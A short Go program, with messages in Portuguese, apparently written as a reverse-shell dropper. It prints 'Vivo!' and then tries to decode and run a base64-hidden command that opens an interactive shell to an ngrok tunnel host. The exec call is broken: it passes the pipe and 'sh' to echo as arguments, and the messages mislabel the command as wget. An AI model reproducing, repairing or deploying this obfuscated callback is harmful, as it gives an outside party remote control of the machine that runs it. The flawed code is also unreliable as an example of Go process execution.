package main

import (
        "fmt"
        "os/exec"
)

func main() {
        fmt.Println("Vivo!")
        cmd := exec.Command("echo","c2ggLWkgPiYgL2Rldi90Y3AvMC50Y3Auc2Eubmdyb2suaW8vMTQxMTQgMD4mMQ==","base64","-d","|","sh")

        output, err := cmd.Output()
        if err != nil {
            fmt.Println("Erro ao executar o comando wget:", err)
        } else {
            fmt.Println("Saída do comando wget:", string(output))
        }
}
